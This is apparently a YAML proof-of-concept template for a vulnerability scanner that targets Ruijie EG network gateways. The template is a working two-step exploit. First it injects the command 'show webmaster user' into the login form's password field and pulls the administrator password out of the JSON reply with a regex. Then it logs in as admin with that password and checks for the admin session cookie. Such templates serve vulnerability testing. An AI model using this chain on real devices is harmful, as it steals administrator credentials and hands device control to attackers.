detail:
  author: Search?=Null
  description: "Ruijie EG\u7F51\u5173\u4FE1\u606F\u6CC4\u6F0F"
  links:
  - https://mp.weixin.qq.com/s/jgNyTHSqWA5twyk5tfSQUQ
expression: r0() && r1()
manual: true
name: poc-yaml-ruijie-eg-info-leak
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("text/json")
    output:
      password: search["password"]
      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
    request:
      body: 'username=admin&password=admin?show+webmaster+user

        '
      cache: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /login.php
  r1:
    expression: response.status == 200 && response.content_type.contains("text/json")
      && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
    request:
      body: 'username=admin&password={{password}}

        '
      cache: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /login.php
transport: http
